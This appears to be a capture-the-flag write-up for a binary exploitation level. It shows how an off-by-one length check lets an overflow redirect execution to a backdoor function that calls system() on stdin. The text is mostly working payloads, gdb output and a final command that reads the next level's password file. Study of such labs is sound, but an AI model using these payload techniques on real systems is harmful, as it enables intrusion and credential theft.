# Level 09

We have an executable asking for a name and a message who will be sent we don't know where.
```sh
$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 42
>: Welcome, 42
>: Msg @Unix-Dude
>>: reef > free
>: Msg sent!
```

By reading the source code, we can see a very useful function: secret_backdoor() which calls the system function by passing it the standart input as an argument. 
```c
int secret_backdoor()
{
  char s[128];

  fgets(s, 128, stdin);
  return system(s);
}
```
We're going to have to find a way of calling this function after the code has been executed.

Looking a little deeper into the source code, we see that the message and its length are located in a structure.

If we want to create an overflow, the length of the message must exceed the length of the array (140 char). Just in case, there's a way to overflow memory in the set_username() function. 
The loop at the end of the function will store the first 40 characters retrieved by fgets() in the "name" part of the structure, which is an array of 40 char. But what a pity, the condition is badly done! It says "i <= 40" instead of "i < 40", so the function will store one extra byte in the structure over the length.

We can then provoke our first segfault, and use this to inject the call to our backdoor:
```sh
$ (python -c 'print("A" * 40 + "\xca")') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

But first, we have to find the secret_backdoor() address:
```sh
(gdb) r <<< $(python -c 'print("A" * 40 + "\xca")')
Starting program: /home/users/level09/level09 <<< $(python -c 'print("A" * 40 + "\xca" * 146)')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555550000 in ?? ()
(gdb) disass secret_backdoor 
Dump of assembler code for function secret_backdoor:
	0x000055555555488c <+0>:	push   %rbp
	...
```
So we see that the address on which the program crashes is 0x0000555555550000, and that the address of our function is 0x000055555555488c. There's only a 2-byte difference between the two, so we can replace just that!

```sh
$ (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
```